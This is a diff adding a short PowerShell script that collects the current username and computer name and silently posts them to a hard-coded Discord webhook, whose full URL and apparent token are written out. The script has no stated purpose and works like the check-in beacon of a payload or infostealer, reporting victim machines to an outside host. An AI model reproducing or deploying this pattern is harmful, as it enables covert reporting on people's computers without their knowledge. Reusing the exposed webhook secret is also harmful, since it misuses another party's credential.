@@ -1,0 +1,17 @@
+# Define the webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1277401036809572475/_pXb-6v9wYFAUxRHWpukoPbaRekI0ehKgaNrL0kBWPB1-m504z1fxkHMQAzpFE9be_cc"
+
+# Get the username and PC name
+$user = $env:USERNAME
+$pcName = $env:COMPUTERNAME
+
+# Create the message in the format 'user@pc'
+$message = "$user@$pcName"
+
+# Create the payload
+$payload = @{
+    content = $message
+} | ConvertTo-Json
+
+# Send the message to the webhook
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
